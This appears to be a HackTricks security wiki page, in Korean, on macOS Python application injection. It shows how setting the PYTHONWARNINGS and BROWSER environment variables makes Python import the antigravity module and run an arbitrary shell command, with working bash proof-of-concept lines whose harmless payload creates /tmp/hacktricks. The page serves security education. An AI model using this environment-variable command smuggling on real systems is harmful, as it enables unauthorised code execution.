# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` 및 `BROWSER` 환경 변수를 통한 방법

공격자가 Python 프로세스의 environment를 제어할 수 있다면, `PYTHONWARNINGS`와 `BROWSER`를 함께 사용하여 Python이 조작된 warning option을 처리하는 동안 `antigravity` module을 import할 때 command execution을 trigger할 수 있습니다. 이 technique은 `antigravity`가 Python의 `webbrowser` module을 사용해 URL을 열고, 이 module이 `BROWSER` environment variable을 따르기 때문에 작동합니다.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Environment Variables를 이용한 Hacking - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
